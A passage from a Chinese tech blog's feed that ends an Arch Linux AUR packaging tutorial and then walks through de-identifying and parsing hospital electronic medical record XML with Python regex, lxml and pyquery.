<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">grub-mkconfig</span> -o /boot/grub/grub.cfg<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>需要用户手动修改设置来启用（基本上主题、桌面挂件之类的包都是这么做的）</p>
<h2 id="闲话">闲话</h2>
<p>暑假的时候打了十几个野包，当时水平也菜，刚洗手变成Arch玩家没多久，打的十几个包都没放到AUR上丢人。虽然现在还是真蒟蒻在群里围观各路大佬卖弱不敢说话，看到中文的打包教程这么少，决定还是写点什么。</p>
<p>当时搜AUR打包相关的资料，发现相关的文章、博客、资料并不多（尤其是中文的）。中文资料保守估计不到Archlinux安装教程的百分之一，也不到deb、rpm、Flatpak打包教程的百分之一。</p>
<p>Archlinux安装弄的这么难初衷可能是为了筛掉一部分小白和伸手党，不过网上各路保姆级安装教程（一步一步手把手教的视频演示那种）和各种一键安装脚本和 Arch based 的发行版基本上快让<span class="exturl" data-url="aHR0cHM6Ly93aWtpLmFyY2hsaW51eC5vcmcvaW5kZXgucGhwL0FyY2hfTGludXhfKOeugOS9k+S4reaWhyk=">Arch的理念<i class="fa fa-external-link-alt"></i></span>流产了(特别是广为诟病的Manjaro和网上一大堆不负责任的教程，一口一个适合小白，动不动就教人添加ArchlinuxCN源，搞得很多打包者不堪骚扰)</p>
<p>小白倒没什么，主要是被伸手党搞怕了。</p>
<p>独立打一个包应该不会比独立装一个Archlinux难（不考虑Nvidia双显卡博通网卡阴间主板诡异驱动等....）。<br />
如果一个用户能参照ArchWiki独立装好、配置好自己的Arch，那就应该有能力自己打包。<br />
Arch没有Mac、Windows、ChromeOS那样的财大气粗的公司和掏钱买服务的客户，甚至不能跟RHEL和Ubuntu比，社区纯靠热情。而且由于deb系和rpm系用户众多，基本大部分软件如果支持Linux会给出deb或者rpm的包，有的可能会给个appimage的包，Arch的支持基本没太多上游会管，很多包都是Arch的维护者和用户自行编译打包的（不少还是deb拆包转的）。 伸手党太多而打包者太少，那就离凉凉不远了。<br />
下次看到没有包当伸手党可不好，没有包就自己打一个吧。</p>
<h2 id="参考和推荐阅读">参考和推荐阅读</h2>
<p><span class="exturl" data-url="aHR0cHM6Ly93aWtpLmFyY2hsaW51eC5vcmcvaW5kZXgucGhwL0RldmVsb3Blcldpa2k6SW5kZXg=">DeveloperWiki<i class="fa fa-external-link-alt"></i></span> 里面关于打包的部分可以看看<br />
<span class="exturl" data-url="aHR0cHM6Ly93aWtpLmFyY2hsaW51eC5vcmcvaW5kZXgucGhwL0FyY2hfcGFja2FnZV9ndWlkZWxpbmVz">Arch package guidelines<i class="fa fa-external-link-alt"></i></span> Arch官方的打包指南<br />
[PKGBUILD_(简体中文)]https://wiki.archlinux.org/index.php/PKGBUILD_(简体中文) PKGBUILD的简要介绍<br />
<span class="exturl" data-url="aHR0cHM6Ly93aWtpLmFyY2hsaW51eC5vcmcvaW5kZXgucGhwL01ha2Vwa2dfKOeugOS9k+S4reaWhyk=">Makepkg_(简体中文)<i class="fa fa-external-link-alt"></i></span> Makepkg也比较重要，有需要可以参考维基修改一下参数<br />
<span class="exturl" data-url="aHR0cHM6Ly9mZWxpeGMuYXQvMjAxNy8wOC9tYWtlLWFuLWFyY2gtcGFja2FnZS1mb3ItcHl0aG9uLW1vZHVsZS8=">给 Arch 打一个包 – Python 模块篇<i class="fa fa-external-link-alt"></i></span> python的包经常没什么人愿意打（确实依赖比较麻烦，好在有肥猫，打了一大堆python包），希望多来点熟悉python的大佬<br />
<span class="exturl" data-url="aHR0cHM6Ly9tYW4uYXJjaGxpbnV4Lm9yZy9tYW4vUEtHQlVJTEQuNQ==">PKGBUILD参考手册<i class="fa fa-external-link-alt"></i></span> Arch官网的参考手册，话说Arch最近新上的<span class="exturl" data-url="aHR0cHM6Ly9tYW4uYXJjaGxpbnV4Lm9yZy8=">手册索引<i class="fa fa-external-link-alt"></i></span>挺香的（btw I use tldr）<br />
<span class="exturl" data-url="aHR0cHM6Ly93d3cudnVsdHIuY29tL2RvY3MvYnVpbGRpbmctcGFja2FnZXMtb24tYXJjaC1saW51eA==">Building Packages on Arch Linux (Including the AUR)<i class="fa fa-external-link-alt"></i></span> Vultr的教程（我也不知道Vultr怎么会有这种东西）<br />
<span class="exturl" data-url="aHR0cHM6Ly9qdW55dXNzaC5naXRodWIuaW8vcC9hcmNoLWxpbnV4LXBhY2thZ2UtcXVpY2stc3RhcnQv">Arch Linux 第一次打包就上手<i class="fa fa-external-link-alt"></i></span> 新手可以看看这个</p>
]]></content>
      <categories>
        <category>不务正业系列</category>
      </categories>
      <tags>
        <tag>AUR</tag>
        <tag>Archlinux</tag>
      </tags>
  </entry>
  <entry>
    <title>处理电子病历</title>
    <url>/81d4/</url>
    <content><![CDATA[<p>有两种鬼画符，一种是医生的字，一种是正则表达式 <span id="more"></span></p>
<p>周某出狱了，而我也开始打工了，咳咳</p>
<p>最近开始折腾电子病历之类的东西，有几家医院的原始数据，几乎都是xml之类的（都是接口导出的，反正从医院要不到数据库里面的原始数据），不同医院数据格式和医生书写风格差的还挺大。</p>
<p><em>下面这些基本都是用的python的库</em></p>
<h2 id="解析和提取内容">解析和提取内容</h2>
<h3 id="脱敏">脱敏</h3>
<p>先脱敏，大概的姓名身份证号住址啥的都挑出来抹掉，一般拿正则表达式替换一下就行了</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> re

p1 <span class="token operator">=</span> <span class="token string">r'&lt;姓名.*?>.*?&lt;/姓名>'</span>
p2 <span class="token operator">=</span> <span class="token string">r'&lt;姓名>小明&lt;/姓名>'</span>
newtext <span class="token operator">=</span> re<span class="token punctuation">.</span>sub<span class="token punctuation">(</span>p1<span class="token punctuation">,</span> p2<span class="token punctuation">,</span> text<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h3 id="提出内层html">提出内层html</h3>
<p>xml里面嵌套了一层html（还是html4.0），html里面又嵌套了几段xml</p>
<pre class="line-numbers language-xml" data-language="xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0" encoding="utf-8"?></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token namespace">soap:</span>Envelope</span> <span class="token attr-name"><span class="token namespace">xmlns:</span>soap</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://schemas.xmlsoap.org/soap/envelope/<span class="token punctuation">"</span></span> <span class="token attr-name"><span class="token namespace">xmlns:</span>xsi</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://www.w3.org/2001/
XMLSchema-instance<span class="token punctuation">"</span></span> <span class="token attr-name"><span class="token namespace">xmlns:</span>xsd</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://www.w3.org/2001/XMLSchema<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token namespace">soap:</span>Body</span><span class="token punctuation">></span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>getHospitalInfoResponse</span> <span class="token attr-name">xmlns</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://tempuri.org/<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>getHospitalInfoResult</span><span class="token punctuation">></span></span>true<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>getHospitalInfoResult</span><span class="token punctuation">></span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>HTML</span><span class="token punctuation">></span></span><span class="token entity named-entity" title="&lt;">&amp;lt;</span>!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN"<span class="token entity named-entity" title="&gt;">&amp;gt;</span><span class="token entity named-entity" title="&lt;">&amp;lt;</span>HTML<span class="token entity named-entity" title="&gt;">&amp;gt;</span><span class="token entity named-entity" title="&lt;">&amp;lt;</span>
            HEAD<span class="token entity named-entity" title="&gt;">&amp;gt;</span><span class="token entity named-entity" title="&lt;">&amp;lt;</span>TITLE<span class="token entity named-entity" title="&gt;">&amp;gt;</span>Demo For Lord<span class="token entity named-entity" title="&lt;">&amp;lt;</span>/TITLE<span class="token entity named-entity" title="&gt;">&amp;gt;</span><span class="token entity named-entity" title="&lt;">&amp;lt;</span>META http-equiv=Content-Type 
            content="text/html; charset=unicode"<span class="token entity named-entity" title="&gt;">&amp;gt;</span><span class="token entity named-entity" title="&lt;">&amp;lt;</span>META content="MSHTML 6.00.2900.6182"

            中间太长略去

            多重耐药菌防控措施处置表 (42)出科病历评分表 (43)病历排序<span class="token entity named-entity" title="&lt;">&amp;lt;</span>/FONT<span class="token entity named-entity" title="&gt;">&amp;gt;</span><span class="token entity named-entity" title="&lt;">&amp;lt;</span>/P<span class="token entity named-entity" title="&gt;">&amp;gt;</span><span class="token entity named-entity" title="&lt;">&amp;lt;</span>P<span class="token entity named-entity" title="&gt;">&amp;gt;</span><span class="token entity named-entity" title="&amp;">&amp;amp;</span>nbsp;<span class="token entity named-entity" title="&lt;">&amp;lt;</span>/P<span class="token entity named-entity" title="&gt;">&amp;gt;</span><span class="token entity named-entity" title="&lt;">&amp;lt;</span>/BODY<span class="token entity named-entity" title="&gt;">&amp;gt;</span><span class="token entity named-entity" title="&lt;">&amp;lt;</span>/HTML<span class="token entity named-entity" title="&gt;">&amp;gt;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>HTML</span><span class="token punctuation">></span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>errorMsg</span><span class="token punctuation">></span></span>string<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>errorMsg</span><span class="token punctuation">></span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>getHospitalInfoResponse</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span><span class="token namespace">soap:</span>Body</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span><span class="token namespace">soap:</span>Envelope</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>除了最外层的xml，其他的标签都被转码了。</p>
<pre class="line-numbers language-xml" data-language="xml"><code class="language-xml">@<span class="token entity named-entity" title="&amp;">&amp;amp;</span>lt;/FONT<span class="token entity named-entity" title="&amp;">&amp;amp;</span>gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>先把<code>&amp;amp;</code>转码回<code>&amp;</code>，再把<code>&amp;lt;</code>转为<code>&lt;</code>，<code>&amp;gt;</code>转回<code>&gt;</code></p>
<p>转完之后会变成熟悉的标签</p>
<pre class="line-numbers language-xml" data-language="xml"><code class="language-xml">@<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>FONT</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>然后删掉空格之类的<code>&amp;nbsp;</code>以及<code>&amp;amp;nbsp;</code></p>
<p>规整的数据，比如一些用标签区分出来的数据，解析一下XML或者用直接用正则表达式提出来</p>
<pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>FONT</span> <span class="token attr-name">color</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>#000000</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>STRONG</span><span class="token punctuation">></span></span>主诉:<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>STRONG</span><span class="token punctuation">></span></span>颈部不适伴头痛、头晕2周，加重1周。<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>FONT</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<pre class="line-numbers language-python" data-language="python"><code class="language-python">chief_compliant <span class="token operator">=</span> <span class="token string">r'(?&lt;=&lt;STRONG>主诉:&lt;/STRONG>).*?(?=&lt;/FONT>)|(?&lt;=&lt;STRONG>主诉：&lt;/STRONG>).*?(?=&lt;/FONT>)'</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<h3 id="病案号等xml中的内容">病案号等xml中的内容</h3>
<p>病案号之类的可以用正则直接抽</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python">medical_record_number <span class="token operator">=</span> <span class="token string">r'&lt;病案号.*?>.*?&lt;/病案号>'</span>
medical_record_number_temp <span class="token operator">=</span> regex<span class="token punctuation">.</span>findall<span class="token punctuation">(</span>medical_record_number<span class="token punctuation">,</span> htmlhandle<span class="token punctuation">)</span>
<span class="token keyword">if</span> medical_record_number_temp<span class="token punctuation">:</span>
    modified_number <span class="token operator">=</span> <span class="token string">r'\d&#123;6&#125;(?=&lt;/病案号>)'</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"病案号："</span><span class="token punctuation">,</span> regex<span class="token punctuation">.</span>findall<span class="token punctuation">(</span>modified_number<span class="token punctuation">,</span> medical_record_number_temp<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">else</span><span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"病案号："</span><span class="token punctuation">,</span> <span class="token string">"Null"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h3 id="html部分">html部分</h3>
<p>要完整的把html中所有的字段都分析一下然后重新存到数据库里面，正则表达式就麻烦起来了，还是直接用xml库解析一下xml比较好，比如Xpath和Beautifulsoup之类的（这里建议数据量大、操作多的直接上lxml和regex、re2之类的，不用Beautifulsoup和re这两个库）</p>
<p>先用utf-8编码读取</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span>path<span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">,</span> encoding<span class="token operator">=</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> xmlread<span class="token punctuation">:</span>
    xmltext <span class="token operator">=</span> xmlread<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p>用lxml直接解析的时候会出报错，因为lxml不认unicode之类的，我们给他转成byte</p>
<pre class="line-numbers language-log" data-language="log"><code class="language-log">ValueError: Unicode strings with encoding declaration are not supported. Please use bytes input or XML fragments without declaration.<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>加一句</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python">myxml_b <span class="token operator">=</span> <span class="token builtin">bytes</span><span class="token punctuation">(</span><span class="token builtin">bytearray</span><span class="token punctuation">(</span>xmltext<span class="token punctuation">,</span> encoding<span class="token operator">=</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>然后用lxml解析就好了</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python">myxml <span class="token operator">=</span> etree<span class="token punctuation">.</span>XML<span class="token punctuation">(</span>myxml_b<span class="token punctuation">)</span>
result <span class="token operator">=</span> etree<span class="token punctuation">.</span>tostring<span class="token punctuation">(</span>myxml<span class="token punctuation">,</span>pretty_print <span class="token operator">=</span> <span class="token boolean">True</span><span class="token punctuation">,</span>encoding <span class="token operator">=</span> <span class="token string">"utf-8"</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>result<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p>要提取的主要信息都在html部分里面，外层的xml里面没啥东西，我们直接把外层的xml扔了，解析里面的html</p>
<p>另存为html就可以在浏览器里看到了，使用F12调试工具可以直接抓取html里面元素的xpath</p>
<figure>
<img src="/81d4/image-20200426094024186.png" alt="病历" /><figcaption aria-hidden="true">病历</figcaption>
</figure>
<p>但是仔细一看发现这个病历的html标签每份不太一样，比如有的第10对p标签里面是主诉的东西，但是另一份病历第10对p标签里面是住院病人离院责任书。没有固定的标志位，不太好提，不如直接上正则。</p>
<p>多看了几份病历发现小问题很多，格式一点也规整，比如主诉，不同病历有下面这几种</p>
<pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>FONT</span> <span class="token attr-name">color</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>#000000</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>STRONG</span><span class="token punctuation">></span></span>主诉:<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>STRONG</span><span class="token punctuation">></span></span>颈部不适伴头痛、头晕2周，加重1周。<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>FONT</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>FONT</span> <span class="token attr-name">color</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>#000</span><span class="token punctuation">></span></span>主诉:<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>FONT</span> <span class="token attr-name">color</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>#ff0000</span><span class="token punctuation">></span></span>反复咳嗽、<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>FONT</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>FONT</span> <span class="token attr-name">color</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>#4682b4</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>FONT</span> <span class="token attr-name">color</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>#ff0000</span><span class="token punctuation">></span></span>心累、气紧6年，<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>FONT</span><span class="token punctuation">></span></span>双下肢水肿4年，加重12天<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>FONT</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>FONT</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>STRONG</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>FONT</span>
<span class="token attr-name">&lt;P</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>FONT</span> <span class="token attr-name">color</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>steelblue</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>STRONG</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>FONT</span> <span class="token attr-name">color</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>#000</span><span class="token punctuation">></span></span>主诉<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>FONT</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>STRONG</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>FONT</span><span class="token punctuation">></span></span>:发现血压升高30+年，反复头晕4+月，加重1天<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>P</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p>有的连冒号都被颜色标签截断了，最后索性用正则直接拉取含有主诉的p标签内的整段</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># 主诉（re方法）</span>
<span class="token comment"># chief_compliant = r'(?&lt;=&lt;STRONG>主诉.*?&lt;/STRONG>).*?(?=&lt;/FONT>)|(?&lt;=&lt;STRONG>主诉：&lt;/STRONG>).*?(?=&lt;/FONT>)'</span>
chief_compliant <span class="token operator">=</span> <span class="token string">r'&lt;P>&lt;FONT color=steelblue>.*?主诉.*?&lt;/P>'</span>
chief <span class="token operator">=</span> regex<span class="token punctuation">.</span>search<span class="token punctuation">(</span>chief_compliant<span class="token punctuation">,</span> myhtml<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<figure>
<img src="/81d4/image-20200426220846518.png" alt="image-20200426220846518" /><figcaption aria-hidden="true">image-20200426220846518</figcaption>
</figure>
<p>输出的结果再把标签、主诉二字和冒号等删去</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pyquery <span class="token keyword">import</span> PyQuery
chief_text <span class="token operator">=</span> PyQuery<span class="token punctuation">(</span>chief<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token keyword">if</span> chief_text<span class="token punctuation">.</span>text<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token comment"># clean the chief compliant text</span>
    p1 <span class="token operator">=</span> <span class="token string">r'主诉|\n|:|：'</span>
    chief_clean <span class="token operator">=</span> regex<span class="token punctuation">.</span>sub<span class="token punctuation">(</span>p1<span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>chief_text<span class="token punctuation">.</span>text<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    text<span class="token punctuation">.</span>append<span class="token punctuation">(</span>chief_clean<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>差不多能看了</p>
<figure>
<img src="/81d4/image-20200426220726567.png" alt="image-20200426220726567" /><figcaption aria-hidden="true">image-20200426220726567</figcaption>
</figure>
<p>再用同样的方法提现病史的时候遇到了问题，发现正则会把之前主诉的内容也匹配上，这是python正则的懒惰匹配只能向后没有向前。一个办法是抽出来然后删掉主诉</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># 现病史（re方法）</span>
phpi <span class="token operator">=</span> <span class="token string">r'&lt;P>&lt;FONT color=steelblue>.*?现病史.*?&lt;/P>'</span>
hpi <span class="token operator">=</span> regex<span class="token punctuation">.</span>search<span class="token punctuation">(</span>phpi<span class="token punctuation">,</span> myhtml<span class="token punctuation">)</span>
<span class="token keyword">if</span> hpi<span class="token punctuation">:</span>
    <span class="token comment"># remove_tag = r'&lt;[^>]+>'</span>
    <span class="token comment"># hpi_no_tag = regex.sub(remove_tag,'', hpi[0])</span>
    <span class="token comment"># if hpi_no_tag:</span>
    <span class="token comment">#     hpi_no_title_tag = regex.sub(r'主诉','',hpi_no_tag[0])</span>
    <span class="token comment">#     if hpi_no_title_tag:</span>
    <span class="token comment">#         text.append(hpi_no_title_tag[0])</span>
    <span class="token keyword">from</span> pyquery <span class="token keyword">import</span> PyQuery
    hpi_text <span class="token operator">=</span> PyQuery<span class="token punctuation">(</span>hpi<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> hpi_text<span class="token punctuation">.</span>text<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token comment"># clean the hpi compliant text</span>
        p1 <span class="token operator">=</span> <span class="token string">r'\n|:|：'</span>
        hpi_clean <span class="token operator">=</span> regex<span class="token punctuation">.</span>sub<span class="token punctuation">(</span>p1<span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>hpi_text<span class="token punctuation">.</span>text<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        hpi_cut <span class="token operator">=</span> regex<span class="token punctuation">.</span>sub<span class="token punctuation">(</span><span class="token string">'.*?(?=现病史)'</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span>hpi_clean<span class="token punctuation">)</span>
        hpi_end <span class="token operator">=</span> regex<span class="token punctuation">.</span>sub<span class="token punctuation">(</span><span class="token string">'现病史'</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span>hpi_cut<span class="token punctuation">)</span>
        text<span class="token punctuation">.</span>append<span class="token punctuation">(</span>hpi_end<span class="token punctuation">)</span>
<span class="token keyword">else</span><span class="token punctuation">:</span>
    text<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token string">'Null'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>后面5个病史都这样正则匹配很浪费时间，索性把这一大段全抽出来，直接全部去格式变为纯文本</p>
<pre class="line-numbers language-text" data-language="text"><code class="language-text">主诉颈部不适伴头痛、头晕2周，加重1周。现病史2周前患者因长期伏案工作后出现颈部不适伴头痛、头晕，转颈时头晕、头痛加重，休息后症状有所减轻，无伴双上肢放射痛及麻木感，无耳鸣，无视物旋转，无恶心呕吐，无踩棉花感，疼痛与天气变化无关，遂至“都江堰医院”就诊，检查头颅MRI未提示异常。近1周来，患者头晕、头痛加重，为求进一步系统治疗，遂入我科，门诊以“颈椎病”收入住院。入院症见步入病房，神清，精神可，颈部不适伴头痛、头晕，转颈时头晕、头痛加重，休息后症状有所减轻，无伴双上肢放射痛及麻木感，无耳鸣，无视物旋转，无恶心呕吐，无踩棉花感，纳眠可，二便调。既往史否认“糖尿病”、“高血压病”、“冠心病”等慢性病病史，否认“乙肝”、“结核”等传染病病史，否认重大手术史及外伤史。否认药物过敏史及食物过敏史，预防接种史不详。个人史生于四川阿坝长期居住于当地，否认疫区居住史，否认冶游史，否认吸烟、嗜酒等不良嗜好。月经及婚育史，患者自诉近期月经周期紊乱及月经量减少；适龄婚育，育有1女，家人均体健。<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>然后根据主诉、现病史、既往史拆分每一部分</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># 拉取现病史</span>
hpi <span class="token operator">=</span> regex<span class="token punctuation">.</span>findall<span class="token punctuation">(</span><span class="token string">r'(?&lt;=现病史).*?(?=既往史)'</span>chiefandhistory_clean<span class="token punctuation">)</span>
<span class="token keyword">if</span> hpi<span class="token punctuation">:</span>
    text<span class="token punctuation">.</span>append<span class="token punctuation">(</span>hpi<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token keyword">else</span><span class="token punctuation">:</span>
    text<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token string">'Null'</span><span class="token punctuation">)</span>
<span class="token comment"># 拉取既往史</span>
item <span class="token operator">=</span> regex<span class="token punctuation">.</span>findall<span class="token punctuation">(</span><span class="token string">r'(?&lt;=既往史).*?(?=个人史)'</span>chiefandhistory_clean<span class="token punctuation">)</span>
<span class="token keyword">if</span> item<span class="token punctuation">:</span>
    text<span class="token punctuation">.</span>append<span class="token punctuation">(</span>item<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token keyword">else</span><span class="token punctuation">:</span>
    text<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token string">'Null'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h3 id="批量读写文件">批量读写文件</h3>
<p>差不多能读了就把所有的病历批处理一下，这里用os.walk遍历所有xml文件（文件名是HIS标识+xml，不连续，就直接批量拉取了）</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># dir = "./Data1"</span>
<span class="token comment">#使用listdir循环遍历</span>
<span class="token keyword">def</span> <span class="token function">getxml</span><span class="token punctuation">(</span><span class="token builtin">dir</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">import</span> os
    path <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
    <span class="token keyword">if</span> <span class="token keyword">not</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>isdir<span class="token punctuation">(</span><span class="token builtin">dir</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">dir</span><span class="token punctuation">)</span>
        path <span class="token operator">=</span> <span class="token builtin">dir</span>
    dirlist <span class="token operator">=</span> os<span class="token punctuation">.</span>walk<span class="token punctuation">(</span><span class="token builtin">dir</span><span class="token punctuation">)</span>
    <span class="token keyword">for</span> root<span class="token punctuation">,</span> dirs<span class="token punctuation">,</span> files <span class="token keyword">in</span> dirlist<span class="token punctuation">:</span>
        <span class="token keyword">for</span> <span class="token builtin">file</span> <span class="token keyword">in</span> files<span class="token punctuation">:</span>
